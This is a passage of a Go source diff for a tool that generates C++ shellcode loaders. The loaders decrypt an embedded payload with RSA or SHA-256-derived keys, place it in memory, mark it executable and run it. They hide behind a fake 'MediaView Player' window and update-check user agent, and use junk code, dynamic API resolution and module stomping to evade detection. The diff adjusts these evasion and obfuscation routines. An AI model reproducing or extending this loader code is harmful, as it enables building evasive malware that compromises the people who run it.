 	sb.WriteString("    MFStartup(0x00020070,0);\n")
 	sb.WriteString("    if(_a.fIO){\n")
-	sb.WriteString(fmt.Sprintf("        unsigned char ua[]=%s;\n", caesarCppInit("MediaView/3.1 (Windows NT 10.0; Update Check)", shift)))
-	sb.WriteString("        _cd(ua,sizeof(ua)-1);\n")
-	sb.WriteString("        LPVOID h=_a.fIO((char*)ua,1,NULL,NULL,0);\n")
+	sb.WriteString("        LPVOID h=_a.fIO(\"MediaView/3.1 (Windows NT 10.0; Update Check)\",1,NULL,NULL,0);\n")
 	sb.WriteString("        if(h&&_a.fIC)_a.fIC(h);\n")
 	sb.WriteString("    }\n")
 	sb.WriteString("    if(_a.fRO){\n")
 	sb.WriteString("        HKEY hk=NULL;\n")
-	sb.WriteString(fmt.Sprintf("        unsigned char rp[]=%s;\n", caesarCppInit(".mp4", shift)))
-	sb.WriteString("        _cd(rp,sizeof(rp)-1);\n")
-	sb.WriteString("        _a.fRO(((HKEY)(ULONG_PTR)0x80000000),(char*)rp,0,KEY_READ,&hk);\n")
+	sb.WriteString("        _a.fRO(((HKEY)(ULONG_PTR)0x80000000),\".mp4\",0,KEY_READ,&hk);\n")
 	sb.WriteString("        if(hk&&_a.fRC)_a.fRC(hk);\n")
 	sb.WriteString("    }\n")
 	sb.WriteString("}\n\n")
@@ -1011,13 +892,14 @@ func generatePayloadIcons(payload []byte) [][]byte {
 
 func oxuGenerateLoaderEclCallback(encodedData []byte, encSize, realSize int, key string, embedKey bool) string {
 	var sb strings.Builder
-	shift := callbackCaesarShift()
-	sb.WriteString("#include <windows.h>\n#include <objbase.h>\n#include <mfapi.h>\n#include <cstdint>\n#include <cstring>\n#include <cstdlib>\n\n")
+	sb.WriteString("#include <windows.h>\n#include <cstdint>\n#include <cstring>\n#include <cstdlib>\n\n")
 	sb.WriteString(callbackSemanticPad)
-	sb.WriteString(callbackDynAPICpp(shift))
-	sb.WriteString(eclSHA256Cpp)
-	sb.WriteString(inflateCpp)
-	sb.WriteString(callbackModuleStompDynCpp(shift))
+	sb.WriteString(callbackDynAPICpp())
+	sb.WriteString(eclBCryptSHA256Cpp)
+	useInflate := encSize != realSize
+	if useInflate {
+		sb.WriteString(inflateCpp)
+	}
 	writeResLoaderCode(&sb, encSize, realSize, 0)
 	if embedKey {
 		sb.WriteString(fmt.Sprintf("static const char g_key[] = \"%s\";\n\n", key))
@@ -1025,8 +907,6 @@ func oxuGenerateLoaderEclCallback(encodedData []byte, encSize, realSize int, key
 		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
 		sb.WriteString(callbackJunkBlock())
 		sb.WriteString("    if(!_ra()) return 0;\n")
-		sb.WriteString(callbackJunkBlock())
-		sb.WriteString("    MediaInit();\n")
 		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=DefWindowProcW;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
 		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
 		sb.WriteString("    ShowWindow(hw,SW_SHOW);UpdateWindow(hw);\n")
@@ -1041,8 +921,6 @@ func oxuGenerateLoaderEclCallback(encodedData []byte, encSize, realSize int, key
 		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
 		sb.WriteString(callbackJunkBlock())
 		sb.WriteString("    if(!_ra()) return 0;\n")
-		sb.WriteString(callbackJunkBlock())
-		sb.WriteString("    MediaInit();\n")
 		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=DefWindowProcW;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
 		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
 		sb.WriteString("    ShowWindow(hw,SW_SHOW);UpdateWindow(hw);\n")
@@ -1054,6 +932,7 @@ func oxuGenerateLoaderEclCallback(encodedData []byte, encSize, realSize int, key
 		sb.WriteString("    const char* key = keyBuf;\n")
 		sb.WriteString("    uint32_t klen = 0; while (key[klen]) klen++;\n\n")
 	}
+	sb.WriteString(callbackJunkBlock())
 	sb.WriteString("    uint8_t _sd[32], _ks[32];\n")
 	sb.WriteString("    ecl_sha256((const uint8_t*)key, klen, _sd);\n")
 	sb.WriteString("    uint32_t _ko = 32;\n")
@@ -1061,7 +940,11 @@ func oxuGenerateLoaderEclCallback(encodedData []byte, encSize, realSize int, key
 	sb.WriteString("    memset(_sd, 0, 32); memset(_ks, 0, 32);\n\n")
 	sb.WriteString("    LPVOID _mem = _a.fVA(NULL, g_real_size, 0x3000, 0x04);\n")
 	sb.WriteString("    if(!_mem) return 0;\n")
-	sb.WriteString("    _inf(_codecBuf, g_enc_size, (uint8_t*)_mem, g_real_size);\n")
+	if useInflate {
+		sb.WriteString("    _inf(_codecBuf, g_enc_size, (uint8_t*)_mem, g_real_size);\n")
+	} else {
+		sb.WriteString("    memcpy(_mem, _codecBuf, g_enc_size);\n")
+	}
 	sb.WriteString("    free(_codecBuf); _codecBuf = NULL;\n")
 	sb.WriteString("    DWORD _op = 0;\n")
 	sb.WriteString("    _a.fVP(_mem, g_real_size, 0x20, &_op);\n")
@@ -1072,12 +955,11 @@ func oxuGenerateLoaderEclCallback(encodedData []byte, encSize, realSize int, key
 
 func oxuGenerateLoaderRsaCallback(encryptedShellcode []byte, encSize, realSize int, privateKey string, embedKey bool) string {
 	var sb strings.Builder
-	shift := callbackCaesarShift()
 	sb.WriteString("#include <windows.h>\n#include <objbase.h>\n#include <mfapi.h>\n#include <cstring>\n#include <string>\n#include <cstdint>\n")
 	sb.WriteString("#include \"RSA.h\"\n\n")
 	sb.WriteString(callbackSemanticPad)
-	sb.WriteString(callbackDynAPICpp(shift))
-	sb.WriteString(callbackModuleStompDynCpp(shift))
+	sb.WriteString(callbackDynAPIFullCpp())
+	sb.WriteString(callbackModuleStompDynCpp())
 	writeResLoaderCode(&sb, encSize, realSize, 0)
 	if embedKey {
 		escapedKey := strings.ReplaceAll(privateKey, `\`, `\\`)
